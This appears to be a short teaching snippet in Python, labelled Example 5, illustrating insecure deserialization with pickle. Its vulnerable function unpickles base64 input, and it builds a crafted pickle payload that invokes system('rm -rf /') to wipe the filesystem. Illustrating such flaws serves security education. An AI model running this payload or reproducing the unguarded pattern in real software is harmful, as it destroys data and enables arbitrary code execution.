# Example 5: Insecure deserialization (using pickle, inherently dangerous)
import pickle
import base64
def deserialize_data(data):
  decoded_data = base64.b64decode(data)
  return pickle.loads(decoded_data) # Vulnerable line

evil_data = b'c__builtin__\nsystem\n(S\'rm -rf /\'\ntR.' # example of dangerous pickle payload
encoded_evil_data = base64.b64encode(evil_data)
